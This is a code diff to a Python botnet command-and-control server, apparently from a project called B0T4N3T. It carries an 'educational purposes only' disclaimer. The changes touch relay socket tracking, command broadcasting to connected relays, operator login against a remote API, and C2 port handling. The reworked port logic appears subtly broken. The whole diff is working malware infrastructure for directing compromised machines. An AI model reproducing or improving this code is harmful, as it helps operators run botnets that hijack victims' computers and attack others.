@@ -7,21 +7,17 @@ from threading import Thread
 from socket import socket as Sock
 from socket import SOL_SOCKET, SO_KEEPALIVE, SO_REUSEADDR
 import hashlib
-from requests import get as rget
+from requests import (
+    get as rget,
+    Response,
+)
 from colorama import Fore, init as colorama_init
-from modules.config import C2Config
+from modules.config import C2Config, Relay
 from modules.loops import Loops
 from modules.client import Client
 
-
-
-__filename__="cnc"
-__version__="3.0"
-__author__="4lxprime"
-__legit__="I am in no way responsible for anything you do with it and I deny responsibility for any damage it may cause, my program is for educational purposes only, I do not endorse any other use."
-__infos__="This is a 'new version' of my old botnet B0T4N3T"
-
-
+__filename__ = "cnc"
+__legit__ = "I am in no way responsible for anything you do with it and I deny responsibility for any damage it may cause, my program is for educational purposes only, I do not endorse any other use."
 
 config: C2Config = C2Config(True)
 config.setbanner("""
@@ -55,10 +51,10 @@ def broadcast(
 ) -> None:
     log(f"send {data}")
 
-    for relay in config.relay_list.keys():
+    for relay in config.relays_sock.keys():
         try: send(relay, f'{data}', False, False)
         except Exception:
-            config.relay_list.pop(relay)
+            config.relays_sock.pop(relay)
             relay.close()
 
 def find_login(
@@ -67,11 +63,12 @@ def find_login(
 ) -> bool:
     password: str = hashlib.sha256(password.encode()).hexdigest()
 
-    url: str = f"{config.API_URL}/login.php?urlkey={config.URL_KEY}&usr={username}&pass={password}"
+    url: str = f"{config.API_URL}/login?urlkey={config.URL_KEY}&username={username}&password={password}"
     log(f"\n\n{url}\n\n\n\n")
-    res: str = rget(url, timeout=5000).json()
 
-    return res == "ok"
+    res: Response = rget(url, timeout=5000)
+
+    return res.status_code == 200
 
 
 def handle_client(
@@ -107,32 +104,31 @@ def handle_client(
 
         client_loops: Client = Client(config=config)
 
-        Thread(target=client_loops.update_title, args=[client, username],).start()
-        Thread(target=client_loops.command_line, args=[client, username],).start()
+        Thread(target=client_loops.update_title, args=[client, username]).start()
+        Thread(target=client_loops.command_line, args=[client, username]).start()
 
     else:
-        for addr in config.relay_list.values():
+        for addr in config.relays_sock.values():
             print("already knewed relay:", addr)
             if addr[0] == address[0]: # so same ips
                 client.close()
                 return
 
-        config.relay_list.update({client: address})
+        config.relays_sock.update({client: address})
 
 def main() -> None:
     port: int = None
 
-    if config.cnc_addr.CNC_PORT != None : port = config.cnc_addr.CNC_PORT
-
-    else:
-        if len(argv) != 2:
-            log(f'Usage: py {argv[0]} <c&c port>')
+    if len(argv) != 2:
+        if config.cnc_addr.CNC_PORT != None : port = config.cnc_addr.CNC_PORT
+        else:
+            log(f'Usage: py {argv[0]} <cnc port>')
             exit()
 
-        port = argv[1]
-        if not port.isdigit() or port < 1 or port > 65535:
-            log('Invalid C2 port')
-            exit()
+    port = int(argv[1])
+    if port < 1 or port > 65535:
+        log('invalid cnc port')
+        exit()
 
     colorama_init(convert=True)
 
@@ -148,9 +144,9 @@ def main() -> None:
 
     loops: Loops = Loops(config=config)
 
-    if loops.relay_api({'ip': '', 'bots': ''}, True): pass
+    if  (status:=rget(f"{config.API_URL}/version?urlkey={config.URL_KEY}").status_code) == 200: pass
     else:
-        log('Failed to relay api')
+        log(f'Failed to connect to api, (status={status})')
         exit()
 
     s.listen()
